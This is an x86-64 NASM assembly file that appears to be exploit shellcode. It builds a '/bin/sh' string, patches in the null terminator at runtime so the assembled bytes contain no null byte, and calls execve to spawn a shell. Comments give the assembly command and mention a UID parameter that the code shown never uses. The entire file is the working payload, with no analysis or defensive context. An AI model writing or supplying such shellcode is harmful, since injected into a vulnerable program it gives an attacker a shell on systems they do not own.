;
;	assemble with nasm sc.asm -o sc.bin -DUID=<someuid>
;	NOTE: UID must be at least 2 bytes long to avoid null byte

USE64
DEFAULT REL

	section .data
	global _start
	jmp _start

shell:
	db "/bin/sh"
end:
	nop

_start:
	xor rax, rax
	xor rdi, rdi
	xor rsi, rsi
	xor rdx, rdx
	xor rcx, rcx
	mov al, 0x10
	shl rax, 0x8
	sub rsp, rax
	xor rax, rax

execve:
	xor rax, rax
	mov [end], al		; put null byte in place
	lea rdi, [shell]
	mov qword [rsp], rdi
	mov qword [rsp + 8], rax
	mov rsi, rsp
	mov rdx, rax
	mov al, 59
	syscall
	
	
	
